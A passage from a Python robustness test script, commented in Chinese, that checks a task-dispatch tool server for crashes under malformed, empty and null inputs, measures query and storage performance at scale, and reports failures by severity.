        ok = bool(line)  # 只要有响应就是没崩
        record("协议-畸形输入", desc, "返回错误而非崩溃",
               "有响应" if ok else "无响应（可能崩溃）", ok, "高")
    except Exception as exc:
        record("协议-畸形输入", desc, "不崩溃", f"异常：{exc}", False, "严重")

# 崩溃后仍可用
try:
    r = c.data("list_templates")
    record("协议-恢复", "畸形输入轰炸后服务仍可用", "正常返回",
           f"{len(r['templates'])} 个模板", len(r["templates"]) == 7, "高")
except Exception as exc:
    record("协议-恢复", "畸形输入轰炸后服务仍可用", "正常返回", str(exc), False, "严重")

# 所有工具的空参数调用
tools = c.req("tools/list")["result"]["tools"]
crashed = []
for tool in tools:
    try:
        c.call(tool["name"], {})
    except Exception:
        crashed.append(tool["name"])
record("协议-空参数", f"全部 {len(tools)} 个工具空参数调用",
       "均不崩溃", f"{len(crashed)} 个崩溃：{crashed}", not crashed, "严重")

# 所有工具的 null 参数
crashed_null = []
for tool in tools:
    try:
        c.req("tools/call", {"name": tool["name"], "arguments": None})
    except Exception:
        crashed_null.append(tool["name"])
record("协议-null参数", f"全部工具 arguments=null",
       "均不崩溃", f"{len(crashed_null)} 个崩溃", not crashed_null, "高")

c.close()

# ══════════════════════════════════════════════════════════
section("功能 15：数据规模与性能")
# ══════════════════════════════════════════════════════════
c = fresh("scale")
flow = ready(c, "hazard_rectification")

t0 = time.time()
for _ in range(200):
    c.data("dispatch_task", {"flow_id": flow["id"]})
create_time = time.time() - t0
record("规模-写入", "创建 200 个任务", "< 30 秒",
       f"{create_time:.1f} 秒（{create_time/200*1000:.0f}ms/个）", create_time < 30, "中")

t0 = time.time()
c.data("list_tasks", {"limit": 50})
query_time = (time.time() - t0) * 1000
record("规模-查询", "200 任务下分页查询", "< 500ms",
       f"{query_time:.0f}ms", query_time < 500, "中")

t0 = time.time()
c.data("list_tasks", {"assignee": "u0"})
filter_time = (time.time() - t0) * 1000
record("规模-过滤", "按责任人过滤", "< 500ms",
       f"{filter_time:.0f}ms", filter_time < 500, "中")

# 深历史任务
t = c.data("dispatch_task", {"flow_id": flow["id"]})["task"]
for i in range(100):
    c.data("add_note", {"task_id": t["id"], "note": f"第 {i} 条说明", "actor": "u1"})
t0 = time.time()
d = c.data("get_task", {"task_id": t["id"]})["task"]
detail_time = (time.time() - t0) * 1000
record("规模-深历史", "100+ 条历史的任务详情", "< 1000ms 且历史完整",
       f"{detail_time:.0f}ms，{len(d['history'])} 条历史",
       detail_time < 1000 and len(d["history"]) >= 100, "中")

size_mb = os.path.getsize(ROOT / "rb_scale.db") / 1024 / 1024
record("规模-存储", "200 任务的数据库体积", "< 10MB",
       f"{size_mb:.1f} MB", size_mb < 10, "低")

c.close()

# ══════════════════════════════════════════════════════════
# 汇总
# ══════════════════════════════════════════════════════════
print("\n" + "═" * 70)
total = len(records)
passed = sum(1 for r in records if r["ok"])
failed = [r for r in records if not r["ok"]]

by_sev: dict[str, list] = {}
for r in failed:
    by_sev.setdefault(r["severity"] or "低", []).append(r)

print(f"\033[1m总计 {total} 项，通过 {passed}，失败 {len(failed)}\033[0m")

if failed:
    print("\n\033[1m失败明细（按严重度）：\033[0m")
    for sev in ("严重", "高", "中", "低"):
        items = by_sev.get(sev, [])
        if not items:
            continue
        print(f"\n  [{sev}] {len(items)} 项")
        for r in items:
            print(f"    · {r['group']} / {r['scenario']}")
            print(f"      预期：{r['expect']}")
            print(f"      实际：{r['actual']}")

# 存出结构化结果供报告使用
(ROOT / "robustness_results.json").write_text(
    json.dumps(records, ensure_ascii=False, indent=2), encoding="utf-8",
)
print(f"\n结果已写入 robustness_results.json")

# 清理
for path in ROOT.glob("rb_*.db*"):
    path.unlink(missing_ok=True)

sys.exit(0)
